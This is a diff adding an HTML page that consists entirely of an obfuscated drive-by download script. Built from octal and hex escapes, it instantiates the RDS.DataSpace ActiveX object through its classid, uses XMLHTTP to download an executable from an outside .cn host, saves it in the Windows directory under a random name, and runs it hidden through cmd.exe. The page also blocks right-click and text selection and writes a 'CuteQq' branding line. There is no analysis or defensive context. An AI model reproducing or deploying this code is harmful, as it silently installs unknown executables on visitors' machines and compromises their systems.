@@ -1,0 +1,61 @@
+<script>
+<!--
+document.write(unescape("%77%77%77%2E%43%75%74%65%51%71%2E%63%6E%0D%0A%3C%62%72%3E%0D%0A%5A%4A%57%4D%20%36%20%56%65%72%53%69%6F%6E%20%58%70%20%56%31%2E%31%0D%0A"));
+//-->
+</script>
+<noscript>
+<iframe src=*></iframe>
+</noscript>
+<script>
+document.writeln("<script language=javascript>");
+document.writeln("function wwwcuteqqcn2(n) ");
+document.writeln("{ ");
+document.writeln("var Cuteqq2 = Math.random()*n; return 'Cuteqqcn'+Math.round(Cuteqq2)+'.exe';");
+document.writeln("} ");
+document.writeln("Wm=\"Qq784378237\";");
+document.writeln("try ");
+document.writeln("{ Cuteqq2=\"\157\142\";");
+document.writeln("Cuteqq3=\"\x6A\x65\";");
+document.writeln("Cuteqq4=\"\143\164\";");
+document.writeln("Cuteqq5=\"\x41\x64\x6F\x64\x62\x2E\";");
+document.writeln("Cuteqq6=\"\123\164\162\145\141\155\";");
+document.writeln("Cuteqq7=\"\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\";");
+document.writeln("Cuteqq8=\"\130\115\114\110\124\124\120\";");
+document.writeln("Cuteqq9=\"\x6F\";");
+document.writeln("Cuteqq10=\"\160\";");
+document.writeln("Cuteqq11=\"\x65\";");
+document.writeln("Cuteqq12=\"\156\";");
+document.writeln("Cuteqq='http://www.hao123hao123.cn/qq/70.exe';");
+document.writeln("Wm2=\"Qq784378237\";");
+document.writeln("id=\"\143\154\141\163\163\151\144\";");
+document.writeln("id2=\"\x63\x6C\x73\x69\x64\x3A\";");
+document.writeln("id3=\"\102\104\71\66\103\65\65\66\55\66\65\101\63\55\61\61\104\60\";");
+document.writeln("id4=\"\x2D\x39\x38\x33\x41\x2D\x30\x30\x43\x30\x34\x46\x43\x32\x39\x45\x33\x36\";");
+document.writeln("idx=id2+id3+id4;");
+document.writeln("var Cuteqqcn=document.createElement(Cuteqq2+Cuteqq3+Cuteqq4);");
+document.writeln("Cuteqqcn.setAttribute(id,idx);");
+document.writeln("Wm3=\"Qq784378237\";");
+document.writeln("var Cuteqqcn2=Cuteqqcn.CreateObject(Cuteqq7+Cuteqq8,\"\");");
+document.writeln("var Cuteqqcn3=Cuteqqcn.CreateObject(Cuteqq5+Cuteqq6,\"\");");
+document.writeln("Cuteqqcn3.type=1;");
+document.writeln("Cuteqqcn2.open(\"GET\", Cuteqq,0);");
+document.writeln("Cuteqqcn2.send();");
+document.writeln("Wm4=\"Qq784378237\";");
+document.writeln("Chilam=wwwcuteqqcn2(10000);");
+document.writeln("var Chilam2=Cuteqqcn.CreateObject(\"Scripting.FileSystemObject\",\"\");");
+document.writeln("var tmp=Chilam2.GetSpecialFolder(0); Chilam= Chilam2.BuildPath(tmp,Chilam);");
+document.writeln("Wm5=\"Qq784378237\";");
+document.writeln("Cuteqqcn3.Open();");
+document.writeln("Chilam3=Cuteqqcn2.responseBody;");
+document.writeln("Cuteqqcn3.Write(Chilam3);");
+document.writeln("Cuteqqcn3.SaveToFile(Chilam,2); Cuteqqcn3.Close();");
+document.writeln("Wm6=\"Qq784378237\";");
+document.writeln("var Chilam3=Cuteqqcn.CreateObject(\"Shell.Application\",\"\");");
+document.writeln("wwwcuteqqcn=Chilam2.BuildPath(tmp+'\\\\system32','cmd.exe');");
+document.writeln("Chilam3.SHelLExEcuTe(wwwcuteqqcn,' /c '+Chilam,\"\",Cuteqq9+Cuteqq10+Cuteqq11+Cuteqq12,0);");
+document.writeln("Wm7=\"Qq784378237\";");
+document.writeln("} catch(WwwCuteQqCn) { WwwCuteQqCn=1; }");
+document.writeln("</script\>");
+</script>
+<script type="text/jscript">function init() { document.write("\167\167\167\56\103\165\164\145\121\161\56\143\156\74\142\162\76\132\112\127\115\40\66\40\126\145\162\123\151\157\156\40\130\160\40\126\61\56\61");}window.onload = init;</script>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
